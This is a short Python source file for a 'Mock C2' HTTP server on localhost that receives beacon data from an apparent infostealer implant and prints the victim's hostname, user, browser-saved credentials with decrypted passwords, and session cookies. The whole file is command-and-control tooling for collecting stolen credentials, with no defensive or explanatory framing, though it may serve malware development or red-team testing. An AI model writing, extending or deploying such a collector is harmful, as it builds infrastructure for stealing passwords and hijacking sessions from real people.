from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import traceback

class MockC2(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        print(f"\n{'='*60}")
        print(f"NEW BEACON DATA FROM {self.client_address[0]}")
        print(f"{'='*60}")
        
        try:
            data = json.loads(post_data)
            print(f"Host: {data['os']['hostname']} | User: {data['security']['current_user']}")
            
            browser_data = data.get('browser_data', {})
            creds = browser_data.get('credentials', [])
            cookies = browser_data.get('cookies', [])
            
            print(f"\n--- CREDENTIALS ({len(creds)} found) ---")
            for cred in creds:
                # Filtre para mostrar apenas senhas descriptografadas primeiro, ou limite a quantidade
                if cred.get('password_decrypted'):
                    print(f"[{cred['browser']}] {cred['url']} | User: {cred['username']} | Pass: {cred['password_decrypted']}")
                else:
                    print(f"[{cred['browser']}] {cred['url']} | User: {cred['username']} | Pass: [ENCRYPTED]")
                    
            print(f"\n--- COOKIES (Top 10) ---")
            for cookie in cookies[:10]:
                # Garante que 'value' não seja None antes de tentar fatiar
                cookie_value = cookie.get('value', '')
                if cookie_value:
                    print(f"[{cookie['browser']}] {cookie['domain']} | {cookie['name']}={cookie_value[:50]}...")
                else:
                    print(f"[{cookie['browser']}] {cookie['domain']} | {cookie['name']}=[EMPTY]")
                    
        except Exception as e:
            print(f"Error parsing JSON: {e}")
            traceback.print_exc()
            
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ACK")

if __name__ == "__main__":
    server_address = ('127.0.0.1', 8000)
    httpd = HTTPServer(server_address, MockC2)
    print(f"Mock C2 Server running on {server_address[1]}")
    httpd.serve_forever()